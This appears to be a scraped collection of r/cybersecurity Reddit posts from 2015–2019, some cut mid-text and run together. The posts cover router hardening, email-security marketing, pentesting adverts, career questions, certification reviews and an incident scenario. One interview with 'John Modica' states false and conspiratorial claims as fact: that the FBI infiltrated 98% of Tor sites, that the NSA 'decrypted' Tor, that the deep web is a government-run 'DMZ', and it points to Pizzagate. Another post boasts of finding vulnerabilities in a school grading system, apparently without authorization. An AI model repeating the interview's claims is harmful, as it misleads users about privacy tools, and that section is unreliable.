more attack surface exposed. Therefore the way we disable unnecessary services on our operating systems, we should apply the same principal to router as well. Services like Telnet, SNMP, SSH should be turned off and only one port/service should be made available to access the interface of the router. 17. **Verify your router settings and security :** Test your routers accessibility from the internet using websites like censys.io that provides you information such as whether your router has publicly accessible services that can be accessed via internet or may use tools like nmap to find out open ports on the real ip side of the router."

Protecting your organization can seem like an overwhelming task since there are so many physical security aspects to consider. Another question to consider is, ""Does the facility manager and the IT manager team up and communicate to make sure they are implementing best practices that actually work together?"" Every business big or small needs to have physical security measures in place. Think about the safety of your employees and your customers. Think about the stories of ATM machines being hacked and card information being stolen as well as ""[jackpotting](URL (ATM machines dispense cash as a result of hackers compromising the machine). Nearly every day there's a new story of a data breach. The highest physical security standard is necessary to protect your assets.

Just to get started, consider the physical security for both outside and inside the premises. ## Outside the Building Often measures are taken such as installing quality locks, placing a fence around the perimeter, and setting up security cameras. Unfortunately these may not be enough to protect the outside security. Gathering places such as designated smoking areas, or break areas can pose a risk of conversations being overheard. Property placement and parking areas must be considered. ## Inside the Building Many companies hire a receptionist who works the lobby to greet guests. If the receptionist was distracted or has stepped away from the desk, the lobby might fail the purpose, to have a visitor check in before entering the building. Outside hackers or malicious insiders could find opportunities through multiple channels. Protecting information from computer screens, copiers, or even guest phones must be considered. Measures need to be taken, policies need to be put in place, and employees need to be trained. Hackers know that employees are usually the easiest access point to find a vulnerability."

228,vulnerability,cybersecurity,The 4 Fundamentals of AI-Based Email Security,0,c689l6,https://www.reddit.com/r/cybersecurity/comments/c689l6/the_4_fundamentals_of_aibased_email_security/,2019-06-28 03:20:33,"*Editor's Note: This blog post was originally found in the* [Agari Email Security blog](URL ![img](iffjddc5nx631) *By Siobhan McNamara* &amp;#x200B; Predictive, AI-based email security is proving to be remarkably effective at protecting against todays most advanced business email compromise (BEC) scams, phishing attacks, and other rapidly evolving email threats. But only when its done right. According to the FBI, targeted email attacks doubled last year, leading to [$1.2 billion in business losses](URL Nearly 30% of all email attacks are launched from a [highjacked email account](URL belonging to a trusted employee or outside partner or supplier, including 1.5 million sent from pirated Office 365 accounts on a monthly basis. More than 90% of all businesses have been hit in just the last 12 months. In the face of this unrelenting assault, signature-based email security, whitelisting, and even modern, cloud-native security controls are hopelessly outgunned on their own. From never-before-seen, zero-day events, to dynamically-generated malware variants that defy detection, attacks grow evermore inventive and dangerous by the nanosecond. Even so, todays most devastating attacks employ simple, plain-text email messages that rely on sophisticated social engineering tactics designed to push emotional buttons in order to manipulate recipients into divulging login credentials or making wire transfers. The average price tag of a successful attack now tops $2 million. When it results in a data breach, youre talking an average $7.9 million and up. The revolution in artificial intelligence (AI), and more specifically, machine learning (ML), can change all this. But to understand how, its important to get past the hype. ## Not All ML is Created Equal Put simply, [machine learning](URL (ML) is a branch of AI thats focused on recognizing patterns and learning from sets of labeled data in order to make predictive business decisions. In the email security space, ML is helping to shift the prevailing defense paradigm from a reactive posture focused on chasing down known threats in an endless game of whack-a-mole, to a proactive approach that recognizes and even anticipates novel attack modalities as quickly as they emerge. Unfortunately, excessive vendor hype and sensational press coverage are undercutting progress by creating unrealistic expectations and obscuring what is required to harness MLs full potential. In parts one and two of this series, we looked at how [Agari Secure Email Cloud](URL leverages machine learning to prevent even the most ingenious zero-day attacks using real-time intelligence from around the globe. In actual deployments, Agari Secure Email Cloud functions with [99.9% efficacy](URL against all BEC and phishing attacks, including those launched from hijacked email accounts. Over time, weve learned that there are four fundamental requirements for achieving this level of performance. ## #1: A Focus on the Good to Expose the Bad Instead of focusing solely on training ML to recognize malicious email in hopes of ferreting out each new attack modality, a far more powerful approach is to model legitimate, good email traffic. After all, the behavior of legitimate users can be quite predictableit only deviates from normative patterns when an account is hijacked or impersonated. The premise behind our approach is simple. We train our models to identify good and normal characteristics of emails, by defining the normal for both behavioral and infrastructural components. If something deviates from this normal, we interpret it as malicious, allowing us to focus only on the very small set of data that is considered bad. Instead of looking for a needle in a haystack, the Agari Secure Email Cloud removes the hay to reveal the needle. ## #2: Globally Scaled, Dynamic Datasets This kind of approach requires a massive datasetand the bigger, the better. The Agari Secure Email Cloud interpolates trillions of emails annually to graph relationships and behavioral patterns between individuals, organizations, domains, infrastructures, and locations, spanning hundreds of raw feature values to define good, trusted email communications at a global scale. It then dynamically scores each new email message against a divergent set of behavioral models, enforcing policies according to a specific businesss needs. But as important as it is, this kind of scale is not enough on its own. In order to continuously refine the solutions capabilities, more than 300 features are updated each day enabling our variety of machine learning models to learn continuously. Through real-time data streaming, intelligence that necessitates model changes is applied not in daily or even hourly batched data updates, but rather within microseconds of detection. Each new customer adds deeper, more relevant insights to this dynamic, global dataset, creating a network multiplier effect that makes the Agari products smarter and more effective with each new email. ## #3: Expertise from the Masters of Their Domains Beyond the size and quality of its dataset, the efficacy of any AI-based approach is predicated on the expertise of the scientists that train it. One of Agaris greatest strengths has always been that our domain experts rank among [the worlds leading authorities](URL on phishing, BEC, and account takeover-based email attacks. In instances where there may not yet be enough labeled data to combat a new attack modality, our human experts can identify the underlying mechanisms behind the scam. We can then start to add heuristics, or rules, to kickstart defenses with this baseline knowledge. As that starts generating labeled data from the field, were able to train machine learning algorithms to generalize away from our expert-derived classifications. In time, ML algorithms begin to recognize patterns that even the most eagle-eyed domain expert may not perceiveincluding the rise of new permutations of the original attackbefore formulating rules that can defeat them. ## #4: Seamless Integration with Cloud Platforms As a growing number of organizations move to Microsoft Office 365, G Suite, and other popular cloud platforms, they face increasing risks from advanced email threats. Office 365 alone now accounts for 36% of all phishing attacks[rising 250%](URL the last year. According to Forbes, [29% of organizations](URL report their O365 email accounts were compromised just within the month of March this year, amplifying their vulnerability to phishing and BEC attacks launched from trusted, internal accounts. To counter these trends, the Agari Secure Email Cloud seamlessly integrates with O365 to block malicious emails that make it through platform-native security controls. With full visibility into employee webmail, Agari uses continuous detection and response technologies to automatically detect and remove any attacks that do make it to employee inboxes. In the next part of this series, well look closer at these capabilities, and how they can help reduce the time it takes to discover and remediate breaches from an average three months to [just minutes](URL ## Prediction: Success Make no mistake. Despite widespread hoopla surrounding this subject, predictive, AI-based email security is playing a very real, and a very important role in helping thousands of industry-leading companies detect, protect against, and respond to BEC scams, phishing attacks, and other metastasizing email threats. For organizations looking to do the same, the four fundamentals described in this post represent key considerations that can help them do it right. *To learn more about how Agari applies the power of machine learning-based AI to prevent phishing attacks, BEC scams and more,* [*download an exclusive white paper*](URL"

It is essential to put up simpler steps on data that helps in securing data. It is essential to keep the threat away, so follow up these simpler tips to improve your cyber security of small business. **1.** **Change passwords regularly** It is essential to opt for a strong or complex password for data safety. The best web development company motivates a regular change of password for websites and other essential data storage. Even password generation works up with user password complexity that makes it essential to provide a protective layer. Hence it is better to change passwords regularly after a month or so. **2.** **Spam filtration** One of the major issues with website and emails are that it doesnt have required protecting again phishing or spam emails. However, there are spam filters that are used by the top custom website development services to avoid spam emails. This provides a smooth experience to the user along with steady network flow. It also offers safety and security to data while keeping any sort of crime away. **3.** **Wi-Fi Permissions** The fact is that even Wi-Fi can attract a lot of spam related or cyber crime activities. It makes the overall matter difficult while protecting data and working on the safety of business sensitive records. Hence, it is essential to limit the users authority on the Wi-Fi network. This is to ensure that data is kept secure while providing the guest network for contractors, customers, vendors, friends, etc. It is the best safety measurement taken by [**Cyber Security Services**](URL by limiting access for the users visiting the office. **4.** **Backup solutions** The fact is that it is essential to maintain backup plans for the data in case of infiltration. It is not difficult to infect the system with a virus that can corrupt the overall structure. Hence, the cyber intelligence services work up on this with the data while backing it up. So, if any virus is installed in the system, the data will be restored and worked up without interrupting any process. **5.** **Anti malware and antivirus protection** Many professionals believe that keeping data safe can be done with the help of best anti malware and antivirus protection.

240,vulnerability,cybersecurity,Where are we lacking tools or automated/facilitative systems in INFOSEC?,1,bwx8j8,https://www.reddit.com/r/cybersecurity/comments/bwx8j8/where_are_we_lacking_tools_or/,2019-06-05 12:05:24,"Some background: I used to work in Vulnerability Management for a large FinTech company. We struggled to find a vuln mgmt tool to track vulns through their lifecycle (discovery to closure). The tools we found were more geared to executive level reporting rather than analyst/engineer level interaction. I know many of these systems try to do this by tying in with a ticketing system, but most of our vulnerabilities required a higher-level, systematic approach (i.e., fixing gold master images instead of fixing every host that was ever generated from them) rather than playing whack-a-mile ad infinitum with tickets. I've often thought about developing a solution that provided this focus since I believe we weren't unique in our way of managing vulnerabilities through their lifecycles. This has also gotten me thinking about other areas in INFOSEC that lack tools or automated systems to make your jobs easier or more efficient. I'd love to hear your thoughts whatever area of INFOSEC you work in and whatever size of business you support."

247,vulnerability,cybersecurity,Why pentesting is important to your Business?,1,b2w649,https://www.reddit.com/r/cybersecurity/comments/b2w649/why_pentesting_is_important_to_your_business/,2019-03-19 22:18:21,"In todays world, it is almost impossible to imagine a business without some type of connection to the Internet  a website, email, employee training, CRM (Customer-relationship management), CMS (Content management system), etc. It simplifies and speeds up the ordering process, search for new clients, records search and keeping, and such. Some businesses use ready-made solutions, others hire professionals to create company-specific tools, and some choose to develop software needed to solve their daily tasks on their own. With time, everyone has their own website, e-mail, their first clients get entered into a database and managers are able to track company daily activities. Unfortunately, an overwhelming majority of businesses completely ignore the fact that every server, every website, every email address is a potential target for hackers. The most frequent excuse used is: *our business is too small, who could possibly be interested in our data*? Is it really so? No. This kind of thinking is one of many mistakes that make the modern Internet more and more vulnerable. Modern digital criminals do not put too much thinking into whom they attack. They do not care if you have your own online store, video blog about kittens or hockey fans forum in the suburbs of South Florida. Second popular excuse that many businesses use for ignoring their web vulnerability is: *web security is too expensive*! Also an incorrect statement. The cost of pentesting starts from $99. &amp;#x200B; To show how vulnerable Internet presence is, we had installed a honeypot (a tracker that analyzes and tracks hacker activities) on our server on a newly created subdomain. Within 5 days, we recorded over 40 thousands scans from more than 30 countries. Approximately one third of all those scans were attempting infiltration. Let me remind you that the address we used was newly created and has never been published! Lets take a look at examples of how hacker attack can happen and what impact it may have on your business. We will also touch on what actions you should take to prevent the attack or at least minimize your exposure, including legal consequences (yes, hackers attack can lead to legal issues for you and your business). ### Example 1 Company A has created a business card website containing information about the company and a feedback form. They developed this site on their own, without the involvement of web designers. As a result, a data validation error was made: the site sent a confirmation to the entered e-mail address with the following message Mr. / Mrs. X, thank you for your message here was the quoted text. Hackers were using the same form of messages to send out links to sites with malicious content, utilizing addresses from the spam list as senders. The domain was blocked as a spam mailer and it took several days to unlock and exclude the domain from the spam lists of large mail servers. The problem was identified by our experts using automated testing for $99 which included detailed troubleshooting. ### Example 2 Company B ordered a website from a professional web designer team, rented a server from an ISP and installed it. A licensed software was installed to transfer the data. Later, a complaint was made about an inconsistent scan that was being carried out from this companys server IP address. Company Bs website was immediately blocked. After pentesting, it was discovered that the ISP failed to change the standard user name and password (admin / admin). Attackers were able to easily infiltrate the server and use Company Bs software for illegal activities. After the server was stripped and reset, the provider allowed further use of the website. The cost was $349. ### Example 3 Company C has developed an ordering system for customers to upload data. While creating an access point, a technical error was made which allowed hackers to steal all the data from all their clients using a SQL-injection. As a result, Company C was put out of business for a week, financial losses amounted to tens of thousands of dollars. The aforementioned technical error was discovered by us. Cost to pentest was $2,500. These are just a few examples. There are dozens, if not hundreds, of attack options. As you can see from these examples, it would have cost these companies a lot less to prevent a hacker attack than to deal with consequences of being hacked. Ask the experts what to do to avoid unpleasant situations. And remember that, unfortunately, invulnerable systems do not exist."

I haven't taken that competitive classes and am often in the middle-level college preparatory class level for most subjects. Due note that my school is extremely competitive and is not really standard high school (i.e Calculus in 12th grade is normal). On the other hand, my career in computer security so far has been extremely strong. &amp;#x200B; Here's what I've done the past 4 years: * 2 Blind SQLi vulnerabilities in school grading system giving me access to over 5 million student and teacher personal records (including health, grades, basically everything the school had on you) * RCE in a piece of software that came pre-installed in all machines by a major computer manufacturer. * Worked for a fortune 50 (not a typo) company this past summer, will most likely work in their security department this summer. * XXE in school grading system. * LFI in school grading system. * Account hijacking vulnerability in health provider (major). * Several XSS/CSRF vulnerabilities in bunch of school and general stuff. * Some other stuff I'm forgetting &amp;#x200B; Point is I have a decent amount of experience for a high school student. Some of my mentors in the field have suggested maybe college isn't right for me, whereas others have strongly suggested it. I know I have stuff to learn, but my question really is, ""Is the stuff that I'm missing not obtainable through experience, and just academic education?"". My biggest concerns of not going to college is getting a job or just not ever learning some things. I'd love to hear your inputs, thanks."

Could solidly handle C++ and Java. Parallel to my college studies, I was in the military part time doing IT windows helpdesk type work. Anyway... after searching for SW dev work for over a stressful half a year post graduation, I connect with a retired military guy and he refered me to a technical position on his ""information assurance"" team at his company. I felt no where near qualified (as it was outlined in the description) though I did have SEC+, a degree and some exp in IT, but I got the job (at a price point that looked amazing to me at the time) and hit the ground running. I learned a lot, picked up a tool specific certification, began learning about the earning potention of the Cyber/Information Security arena. I also learned that one should be compensated for the work one does and the figure should not heavily (nearly exclusively) related to the number of years of experience. Jim is a nuclear physisist who is 15 years my senior, but we both got hired to remove staples from packets of paper... We should be compensated nearly equally. I found out I'm making about 5k below what this company/type of work should offer, and 8-10k less if I'm comparing myself to my peers (tall the Jims). But it was my fault for not negotiating my pay when I recieved the initial offer. I was excited. and Overly greatful. This was the only job that I actually got an interview for. And it was gonna be my first real, full-time, salaried job... Research Research Research. I planned to negotiate my salary during my annual performance and compensation review. And then one of my coworkers, with whom I'd become friends, applied for and became one of our leads and is now my supervisor. (Super happy for them!) Review time rolled around and though I was nervous I still planned to negotiate for more than the standard 3%. So I walk into the meeting room sit down They give thier required corporate shpiel and commends me on my hard work and with genuine elation filling thier body, slide a piece of paper over to me. I looks different than the compensation paperwork from the mid year review. It was a promotion. With a around 10% bump in salary. That was the 6k increase I wanted to ask for... I froze up and couldn't try to negotiate... I was greatful for the recognition and the increase in pay... But I would have been more greatful for *that* increase at my *current* grade... ...And now, here we are half a year since the promotion, still with a sour taste in my mouth, was offered a 2 year retention bonus equal to 2x the diff between what I make and what I should have asked for... But Again I failed to use the offer for the retention bonus as a means to negotiate. (retention bonus was likely because of the shitty turn over rate with all the older people going for better paying jobs). My frustration is having an intense desire to get rid of my student loan debt and car note, and coming to the realization I don't remember how to code and all the IT/Networking stuff is now super fuzzy. I digress... I love this this line of work, but I was promised a super fun technical job.....Instead I do paperwork all day and occasionally audit event logs. The one techy guy on our team (the person I've been instructed to shadow for the past 12 months) is too smart and doesn't know how to dumb stuff down and gets frustrated teaching so avoids it at all cost. So I've been stuck doing my already established tasks... But he has finally come around. **TL;DR:** I do compliance checks and maintain mountains of documentation. I'm finally getting some training on vulnerability assessments. Have CompTIA Security+ certification (maintained since 2014) and am a Certified Splunk Power User. I can make my way around a computer no problem, and I've been wanting to pick up programming again and fortify my IT knowlege. I'm stuggling with the lack of structure away from a lecture hall. Goals: *have some more fun and make some more money (by moving up or moving on)* * set up home lab * learn python * git gud at linux * pursue another certification (even if I don't test for it I feel like it will help with the structure) but I don't know which one. Ultimately I'd like to do penetration testing. What suggestions do you guys have?"

People do not realize the importance of security in general, none the less the basics of Cyber Security. The ethics of keeping good security also works by understanding the vulnerability within your own systems. Some do not realize that what hackers actually do by their illegal activity, is helping companies keep up the security of their systems/networks. Even though we all can hire Ethical Hackers and Pentesters to test our products and such, it is often thought of as a good thing, because it saves us money, and they help us understand where we need to patch up, so we dont lose any more money in damages. So the importance of having the hackers/attakers is actually very grande. Often times enough, these attacks gives us an idea from an outside perspective. # How can we protect our computers better? In this day and age, there really is not a way to actually protect your computers or devices. Deep state will continue to survelle. If a hacker or agnecy wanted to find out who you were and where you are located, they will figure it out. I always say, To master Offensive Security, One must master Defensive Security The best thing to do is use tools that will give you the info on your attackers. Signature based IoCs like Snort, Artillery, Fail2ban, Iptables, Honeypots, and other means to identify and log your issues, would be the easiest thing to have. Most people get out of the Anti-Virus business, because its not the viruses/malwares you need to worry about. # How can we navigate through web more anonymously? Well, I do not like to be the bearer of bad news, but there is no such thing as being anonymous. You see, the FBI has already infiltrated 98% TOR URLs and spoofed them as TOR HoneyPots in 2013. In 2015 ,the NSA officially was able to decrypt the TOR network and remove the most imortant file that kept it some what encrypted. Number one rule of thumb was to never tunnel normal traffic through the TOR Network. By trafficing normal data using the TOR Network you risk leaking alot of data. Then we have Exit Nodes. Each exit Nodes is known to act like a MITM. They are able to see and collect all your data, cookies, and passwords. If you arent using what they call good exit nodes, you get flagged. There is also a group called the Shadow Server Foundation. The Shadow Server Foundation scans the entire dark web on 0.0.0.0\*, to check for suspicious DMZ users. They can be found here [URL . VPNs also get audited every fiscal year. VPN companies do not want to be held responsible for other individuals illegal activities. # For the people who want to begin to learn cybersecurity where should they start? I suggest learning everything you can. Keep up-to-date with threat reports, upcoming threats, and other news. I also suggest getting certifications, and a degree of somekind to help your resume. Good info can be found on [URL Always have a good sense of Defensive security before you get on the Offesive side. # What kind of mistakes people do, when they begin to learn cybersecurity? The biggest mistake people end up doing is, following and believing in other people online with fake aliases. They give out WhatsApp, Email, and other sensitive information in public places. # What advice you can give to those people? The most vital advice I can give those people is to make sure you evaluate the people you speak to online. Things like e-mails, and WhatsApp accounts can be hacked easily. Some people have credit cards and bank information tied to e-mails, as they give up this identity, freely to others. People just give out far too much personal information to relative strangers. K.I.S.S (Keep It Simple Stupid). # What books about cybersecurity you recommend? This is a very general topic. For example, you have the different industries (Health IT, Manufacturing Plants, Car Companies, Cell Phone Companies, Cable companies, State and Federal Governments and their different agencies). You also have the different level of branches and departments (CRISC, CISSP, CTIO, CTO, CEO, SEO, CCNA, Risk Managment, Breach Specialists, ETC). What I can say is, being that Cyber Security is an extentive and broad area, explore a specific aspect you are interested in, and find books related to it. # Can you brief explanation about what is deep web and, how we can acess it? Deep Web is a government controlled part of the internet located on the DMZ, or De-Militarized Zone, where they have websites hosted for BlackMarket, Drugs, Pedophillia, Weapons, and other illegal activity. Some places on the Dark Web has been hosted for hacktivists to use as journals. All of which is being watched. Normally to access it, you need grab the Tor Browser and privoxy. But as I mentioned above, it is no longer encrypted. Some people ruin it for others. # How Tor works? The best answer can be found here: [URL But again, it is no longer encrypted. As long as you traffic normal data using the decrypted network of relays, Tor does not prevent an online service from determining when it is being accessed through Tor. Meaning places like Facebook, and other services can see you are on it. Thats why it was never meant to use for normal data. # Do you think people should visit deep web at least one time and why? No, I do not think anyone needs to go onto the dark web. Simple curiousity can take a dark turn quickly because the deep web is actively being monitored by many entities. Your true identity can be found using the TOR HoneyPots. The DMZ and TOR was originally created for the government, by the government to send and recieve information. If they created it, why would anyone think its anonymous. # Is the deep all bad? No, not all. However, good or bad, it is being monitored. # Does Marianas web exist? I dont think I should answer this one. PIZZAGATE should be enough to answer this. ### What programming language you think people should learn to begin the hacker path? There is many languages to learn. To be honest, the original Fortran language can help you learn the bases of all of the languages available. # What hacking books you recommend? They is too many books available. All information is good information. Each tool has their own books, for the most part. My own personal resource liberary contains 10,000+ volumes that I refer to regularly. However, I caution anyone getting free books from unknown online sources, i.e (social media platforms). These can often lead to bad URLs. # What being hacker means? Being a hacker means to have your own scripts, learning new things everyday, being the first to find a bug, patch, or exploit. People today do not realize that using other peoples tools doesnt make you a hacker. Maybe a pentester, but not a hacker. Using other users scripts and such just means you follow directions well. # What motivates you? Helping, and giving advice motivates me. I personally enjoy motivational speeches and music. ### Whats your definition of sucess? The definition of success, to me, means not taking no as an answer. Do not give up, try harder, and look forward. Persue your ideas and passions. The past is not a mistake, it is an experience \- **John Modica** Facebook [URL I share useful things on Github [URL My twitter [URL Huge thank you to Mr.John Modica for answering this questions.

302,vulnerability,cybersecurity,Certs or Programming?,1,90bs46,https://www.reddit.com/r/cybersecurity/comments/90bs46/certs_or_programming/,2018-07-20 11:36:03,"Hello. I work in the IT industry and I love learning about cyber security. However, recently I've been having some doubts about studying for cyber security certifications, and here's why: as I've studied for my certification, it became apparent to me that all the penetration testings and vulnerability scanning are all about using someone else's tools, so my ability would be quite limited to what other people have already developed if I continue to study only certifications. And this is where I got a new idea: How about developing my own scanning/pen-testing tools instead? I know it's going to be very difficult to develop a cyber security tool on my own, but I think it's better than relying on other people's tools all the time? Doesn't anybody else think this way, too? In this sense, programmers have higher potential to be better cyber security experts than CS professionals who only know how to use other people's pen-testing tools. For example, most cyber security companies have their own in-house tools they developed to serve their customers. Their tools include anti-malware software and other kinds of intrusion detection systems. These companies are the ones that move the cyber security industry forward and make innovations. But cyber security analysts can only make money by consulting clients or doing pen-tests with other people's tools, which is fine but that doesn't really improve the cyber security world in general. Maybe I am just being negative about this whole certification thing. But at some point, certification materials seem very similar to one another and don't really add new ideas to the subject. Certifications seem more about memorizing small details rather than understanding grander ideas or being able to truly improve your skills. Please feel free to criticize. I feel like I am just mumbling at this point."

The general course topics include cryptographic standards used to protect data; best practices of logging and auditing, along with approaches to authentication and authorization; server and router security; forensics concepts and issues; the process, procedures, and technologies for collecting evidence; expectations of evidentiary reports; four basic types of attacks the IT security professional most likely to be encountered; introduction to passwords and password security; a summary of the Biba Integrity Model and the Bell-LaPadula Confidentiality Model; security issues associated with layered architecture model used in the design and study of TCP/IP; common attacks including Denial of Service and DNS tampering; defensive techniques and appliances available to the Information Security professional; wireless networks and the characteristics that can make them vulnerable to attack; operating system vulnerabilities; uses of encryption to include digital signatures and hardware encryption; common software traits, security requirements, vulnerability awareness, input validation, buffer overflows, common defensive programming techniques, and the basic principles of secure software development; secure design objectives and steps, coding standards, why it is important to ""think like an attacker,"" the importance of carefully choosing compilers and languages, risk based testing and DREAD modeling, as well as static and dynamic testing techniques; and Waterfall model, agile development, extreme programming (XP), and the Microsoft Security Development Lifecycle. The methods of evaluation include quizzes, examinations, and other online activities. To receive certification, the student must score 80% or higher on the comprehensive final examination. **ACE Credit recommendation:** In the lower-division baccalaureate/associate degree category, 2 semester hours in introduction to computer security ~~~~~~~~~~~~~~~ My background: BS CS, Ms Software Eng, 20+ yrs experience in Web Dev (virtually no network or security exp, other than web related vulnerabilities, web server security, etc.) Over the last few weeks, I completed each of the four courses of the program. Each course is broken in multiple modules from 4 to 8 depending on the course. Most modules took 60-90 minutes each. The topics were, as expected, very general and high level. It had been a really long time since I had to remember the OSI Model and the various layers, since college, and that level of knowledge is not something that I had ever used since, so that was a good refresher for me. The courses contained a pretty good overview of various networking and hardware topics along with some SDLC concepts. The digital forensics course felt like I was training to be a CSI - it was way more detailed than the network or software courses. I'm really weak in knowledge of networking, so some of this info was new to me. While the course content is decent, there's probably better free videos/courses on Udemy and other sites that addresses more specific content than the general topics covered here (however, I think this would be a good starting point since it does present a decent high level overview). Most of the content was created in 2012-2014, so some of the topics/names are dated a few years, but in general, it's not that bad. As far as applicability, if you're already in cybersecurity related field then this is kindergarten level stuff that you won't get any benefit from. However, if you're just work-adjacent to cybersecurity (web dev, app dev, help desk, etc.) then you might be able to learn a few things (or at least refresh your memory of college level info that you've forgotten). If you're thinking of career change or going for cybersecurity certification or degree, then this would be a good introduction (that's free). "

Now these days malwares are getting advanced day by day. New vulnerabilities getting discovered at lightning speed and takes more time to patch them, mean while systems remain vulnerable to unseen malware attacks which are yet to be added in anti virus databases. Let's say firm ABC uses two different anti virus solutions X and Y. Now major vulnerability comes up in market and cyber security researchers starts to upload malware signatures to public databases such as virus total and anti virus vendor for solution X updates thier database instantly and vendor for solution Y does it 1-2 weeks later. Meaning firm ABC's systems using Y anti virus solutions will remain vulnerable to malware attacks for 1-2 weeks. Now let's try to solve this problem with blockchain technology. As we all know blockchain based ledger can store and distribute data globally and make it available to everyone in few seconds. What if we can develop a system which can store malware signatures on block chain uploaded by community trusted cyber security researchers and all anti virus solution utilises this unified system of malware database. So now whenever new malware is discovered by cyber security researchers all anti virus solutions gets updated with new signatures so they can layout detection techniques for them in less time and security researchers gets paid in crypto currency to support them in thier further research work. This way we are enabling malware researchers directly protecting thousands of businesses relying on anti virus solutions. Don't forget to up vote if you liked my idea :) "

If your answer is a resounding yes, then building a rewarding career in CEH will be a wise move. Getting certified in CEH \(which stands for Certified Ethical Hacker\) is a great investment in the modern world where technology is controlling everything. Beyond giving you the valuable technical know\-how, CEH certification will always remain instrumental in your career. With a CEH certification in your career, you should expect amazing rewards such as boosted salary, advanced security skills, making you highly marketable among others. The article will serve you with convincing reasons that will leave you yawing to build a rewarding career in CEH. **Is it worth becoming a Certified Ethical Hacker?** Many IT professionals tend to ask this question. When you invest your money and time in CEH training, be sure that your money is not going down the drains. So, in other words, being a white hat hacker is worth consideration. Below are main reasons that should drive you towards seeking [CEH training and certification.](URL 1. **Your salary is increased** Once you become a certified professional, you automatically command a higher salary from the company you are working for. It is estimated that the salary for a professional CEH can rise from an average of $50,000 all the way to $132,000 depending on how you will demonstrate your learned skills. If you want to secure a quick rise at the job place and also qualify yourself to better paying job positions, get certified with Ethical Hacking Skills. Below is a detailed illustration from the US IT professionals remuneration packages. **2.With CEH skills, you will have fulfilled DoD Compliance Requirements** Some people are obviously interested in the department of defense in the world. This is not for a specific country but the entire world. If you are among these people, then getting certified in CEH is not optional but a must. For you to be an Information Assurance Officer, you must be certified before you handle any sensitive information as well as network security. Once you graduate as a certified Certified Ethical hacker, you will have fulfilled the requirements of DoD in the following areas: 1. A CSSP Analyst 2. A CSSP Infrastructure Suppor 3. A CSSP Auditor Roles 4. A CSSP Incident Responder **3.You achieve unparalleled job security** The severity and rate at which cyber\-attacks keep climbing are worrying company and organization owners due to the massive losses they are registering worth billions of dollars. For a business to clean up after a cyber hack, it is estimated that they will incur an expense of about $690,000. This is for a small business alone in the middle market level. Against such expenditure, it becomes quite cost effective just to hire a professional well versed in cyber security solutions. This will mean that the company will not worry about an unseen eventuality but also feel secure for the assets and resources of the company are well guarded by a CEH professional. **4.Other benefits** There are other benefits that you will gain after enrolling and graduating as a CEH. They include the following: 1. Improved knowledge of risks as well as vulnerability 2. You can think like a hacker hence resolve a problem or protect its occurrence 3. It will advance your career opportunities in cybersecurity 4. You will get real hacking tools. "

IT is quickly evolving, with regards to the changing security landscapes; however new tools and methodologies bring new vulnerabilities. Hackers are getting more intelligent and updated in understanding the vulnerabilities in the system and for organisations, there is always a risk of losing valuable sensitive information. Nowadays the organizations are moving to cybersecurity background (identity, protect, detect, respond and Recovery). Security Incident &amp; Event Management (SIEM) is upgraded to support SOC operations to identify the real-time security incident &amp; log management and tracking the user suspicious behaviour activities from internal to external or external to internal traffic. SIEM focuses on actual problem solving, monitoring, correlation &amp; processing of security events and also combines two technologies Information security (IM) and event management(EM) which takes place in real time or near real time. These events work on alerts generation by the network device such as Switches, Routers, firewall, IDS, IPS and focus historical approach to log data information to support a detailed investigation Here are six key points to consider when applying a SIEM solution.  Avoid SIEM tools for a single application  Look for a solution with built-in security detection tools such as asset discovery, vulnerability assessment, network analysis, wireless intrusion detection, host-based intrusion detection, network-based intrusion detection, file integrity monitoring, log management.  Before evaluating solutions look for a cause to use cases  This will help better organise and prioritize data sources  Have an evaluation for worst-case scenarios to inform your incident response strategy  Include built-in threat intelligence that utilizes the latest in threat intelligence information  .Use IP reputation data to identify exposures inside and outside the network, to prioritize alarms and to monitor your business reputation  Automate deployment Detailed information here: URL"

But this completely defeats the purpose of the sole 2FA method you are wanting to set up (i.e. U2F security key via USB, NFC or Bluetooth). Having recovery codes as back up, essentially defeats the purpose of using a security key. It is no different than just having backup codes and nothing else. I don't understand why this is set up this way... it just gives users a false sense of security. Any way to disable that? Gmail also has recovery codes that auto generate every 15 seconds, on top of the 10 permanent recovery codes they give you. This seems to be a very big security vulnerability. Any idea how to turn off a second 2FA method on Facebook or GMail? Thanks"

I am new to this area and my knowledge is limited so I'm not sure if my answer to the scenario is suitable or not. Will really appreciate if anyone could point out any issues with my answer and make suggestions. So the scenario is: A small company decided to move their infrastructure to the cloud. During the process they found out one of the database servers has 4 unknown local windows users on it. This triggered a technical review and internal investigation. The issues found were: There were 4 local unknown users created on the server. There were a total of 30 database level users on MS SQL database. 20 web applications stored within the db. Of the 20 web applications 5 were compromised, where 1 site was having command injection issues 1 site was having SQL injection issues 1 site was having XSS and CSRF issues 2 sites were not doing any input validation None of the sites were using HTTPS Two of the database were found to have credit card information Am I correct to assume that the company has security issues with application? Because: The users are created via web applications and stored in the database server, the company have yet to identify the privileges of the 4 unknown users. Any one or all of these unknown users could have malicious intentions. They could be identified as individuals with unauthorised access to the companys network, which means the company may have already being a victim of data breach or data theft. Database server has 20 web application connected. This makes it easier for an attacker to access the data because they only need to crack the administrator account for one server to have access to everything. Sites with command injection, SQL injection, XSS and CSRF are all application security vulnerabilities which attackers can exploit and facilitate cybercrime. In result attackers could target availability, confidentiality, and or integrity of the companys data. During the investigation it is also found that two database contained credit card information and none of the sites were using HTTPS. This looks like the attacker have already started to steal data as the security on the sites are disabled and ask users for credit card information. The company should also review the system logs for any failed authentication attempts, find out the vulnerabilities and know how fix the vulnerability. Thanks!"

While On Cybersecurity Assessments,2,3o8cki,https://www.reddit.com/r/cybersecurity/comments/3o8cki/avoiding_ass_while_on_cybersecurity_assessments/,2015-10-11 03:18:01,"The term Stockholm Syndrome was coined after the 1973 robbery of Kreditbanken in Stockholm, Sweden, in which two robbers held four bank employees hostage from August 23 to 28. During this time, the victims shared a vault and became very familiar with their captorsin fact, they wound up emotionally attached and even defended them after the ordeal. The captives aligned themselves with the captors through empathy. Research states that during the psychological process of Stockholm Syndrome the feelings developed are not a result from a conscious decision or a rational choice to befriend a captor rather, a Freudian response to guard or distance themselves from and remain consciously unaware of unpleasant thoughts, feelings, and desiresand also helps individuals avoid hurt and disorganization. Being Assessed As organizations prepare for inspections; annual or no notice ((wink-wink, you always know when youre getting inspected  so get it together)) a level of anxiety builds among those responsible for securing the enterprise. Responsible teams begin to have weekly POA&amp;M meetings, SLA discussions, RACI charts negotiations, policy creation, and teleconferences concerning who was supposed to do what &amp; when was it supposed to be done with regards to issue resolution most often months overdue. Its too late. Avoiding A.S.S (Assessor Stockholm Syndrome) Those of us who have been tasked to 